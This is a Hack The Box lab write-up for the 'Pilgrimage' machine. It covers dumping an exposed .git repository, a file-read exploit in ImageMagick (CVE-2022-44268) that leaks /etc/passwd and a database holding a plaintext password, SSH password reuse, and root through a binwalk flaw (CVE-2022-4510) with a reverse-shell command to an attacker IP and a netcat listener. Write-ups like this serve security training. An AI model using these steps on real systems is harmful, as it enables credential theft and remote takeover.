---
type: box
finished: "true"
writeup: "true"
---
![pilgrimage](Pilgrimage.png)
# Enumeration
with the nmap command `nmap -p- -sV -sC 10.10.11.219` we got this result:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
So we know there's a SSH server, and a http server running nginx 1.18.0.
Going to the website we come to this page:
![website](writeups/HTB/BOX/Pilgrimage/images/website.png)

We have the option to log in, register or upload an image where it shows the shrunk version of that image. If we make an account and then log in we get a "Dashboard" tab that allows us to see all of the previous images that we have uploaded to the website.

# Git-Dumping
Here I was stuck for a while trying a bunch of stuff. Which is when I went back to enumeration. **Always go back to enumeration if you get stuck, don't tunnel vision because maybe you're missing something.** In my case I was missing an open .git repo on the 80 server. Since we didn't have the IP redirect link in our /etc/hosts nmap gave us this output `http-title: Did not follow redirect to http://pilgrimage.htb/` However if we run `nmap -p 80 -sV -sC 10.10.11.219` again, however this time only on port 80 while having the redirect in out /etc/hosts we get this output:

```
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-title: Pilgrimage - Shrink Your Images
```

Now we know for sure there is a /.git/ folder on the server. Now we can use a tool like [Git dumper](https://github.com/arthaud/git-dumper)to extract all of the information from the git folder on to our own machine and take a look at the source code.

At first I thought there was a problem with the code, however everything seems sanitized. One thing we can keep in note for later though is that the databased is stored in `/var/db/pilgrimage` as we see in the code `$db = new PDO('sqlite:/var/db/pilgrimate');`.
![login](login.png)
But what is this `/var/ww/pilgimage.htb/magik`? Taking a close look at it by going into the git folder and going `./magik -version` we get this output:

```
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)
```

Googling `ImageMagick 7.1.0-49` I came across [a vulnerability with ImageMagick 7.1.0](https://www.metabaseq.com/imagemagick-zero-days/) This vulnerability was is based upon the -resize command within Magick, exactly what we are looking for. If we insert arbitrary code into the image, give it to Magick and then redownload it, we will get the output into the resized image. Let's try it first by making it print out `/etc/password` of the server with this script: **[CVE-2022-44268](https://github.com/voidz0r/CVE-2022-44268)**.

# ARBITRARY REMOTE LEAK with [CVE-2022-44268](https://github.com/voidz0r/CVE-2022-44268)

When we did `cargo run "/etc/passwd"` on the file we got an image with code injected into it. When we upload it to the server and download the "shrunken" version of it we can run `identify -verbose {image}` to get the outputting hex values of our input. Inputting it to something like [CyberChef](https://gchq.github.io/CyberChef/) and converting it from hex to ascii we get this output:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

Just for the fun of it I tried to also get the value of `/etc/shadow` however that did not get us any result because Magick is not allowed to read `/etc/shawdow`. What we can try is to **get the content of the `/var/db/pilgrimage` database as we saw from earlier.** Doing the same thing as earlier we get a bunch of hex values. Plugging that into cyberchef allows us to see the contents of it.

In a bunch of null values we get the sql code:
![table](table.png)

And *much* lower down we see this:
![usernames](usernames.png)

Our own account is which is the *creatively* named `asdfasd` with the password `asdf`.
More importantly we see the user `emily` from before with the password `abigchonkyboi123`. Classy.

With the knowledge that people use the same password everywhere, we can try to ssh into the machine with the username emily and password `abigchonkyboi123`.
![ssh](ssh.png)
**bingo**
Now we cat out the content of the user.txt.
# Privilege escalation with [CVE-2022-4510](https://www.exploit-db.com/exploits/51249)

Looking at the home directory we find some interesting files. Most notably pspy32 and binwalk_exploit.png. Looking at the pspy32 output we see that root is running something called `/sbin/malwarescan.sh`. Looking closer at that we see the following code:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done
```

Here we see code being run every time something is changed in the `/var/www/pilgrimage.htb/shrunk/` directory with the help of the `inotifywait` command. We also see `/usr/local/bin/binwalk -e` being run on every file every time a change is done in that directory. Let's take a look at the binwalk version on this machine.

```
emily@pilgrimage:~$ binwalk -h                                                          

Binwalk v2.3.2                                                                          Craig Heffner, ReFirmLabs                                                               https://github.com/ReFirmLabs/binwalk     
```

If we look up ```binwalk v2.3.2``` we find a remote code execution vulnerbility is in binwalk version 2.3.2. Luckily the [script from exploit database](https://www.exploit-db.com/exploits/51249) is already downloaded on the machine in the `/tmp/` folder.

So all we have to do is to write is `python3 /tmp/51249.py catt.png {YOUR_IP} {YOUR_PORT}` and then start a netcat listener on that port. You will then get an image called `binwalk_exploit.png` in your folder and all you have to do now is copy it over with `cp binwalk_exploit.png /var/www/pilgrimage.htb/shrunk/` and boom.

![root](root.png)

# We're in (conclusion)
This is definitely the hardest box easy box I've done on hack the box. I was stuck on the first step for a long while, when I randomly decided to run the nmap scan again and saw the /.git/ directory. Everything was pretty good from there though. This is probably the best box I've done on HTB to date. I loved getting the user flag immensely. The root flag was a bit tricky, but learning to read the pspy32 output helped a ton.